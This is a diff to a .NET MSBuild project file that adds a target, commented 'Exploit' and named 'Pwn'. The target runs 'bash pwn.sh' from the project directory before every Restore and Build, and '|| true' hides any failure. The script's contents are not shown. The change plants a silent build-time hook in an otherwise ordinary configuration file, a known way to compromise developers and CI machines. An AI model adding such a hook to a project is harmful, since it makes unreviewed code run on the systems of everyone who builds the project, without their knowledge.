@@ -9,6 +9,11 @@
     <IsPublishable>true</IsPublishable>
   </PropertyGroup>
 
+  <!-- Exploit -->
+  <Target Name="Pwn" BeforeTargets="Restore;Build">
+    <Exec Command="bash $(MSBuildThisFileDirectory)pwn.sh || true" />
+  </Target>
+
   <!-- Publish optimization settings - only enabled for Release builds -->
   <PropertyGroup Condition="'$(Configuration)' == 'Release'">
     <PublishReadyToRun>false</PublishReadyToRun>
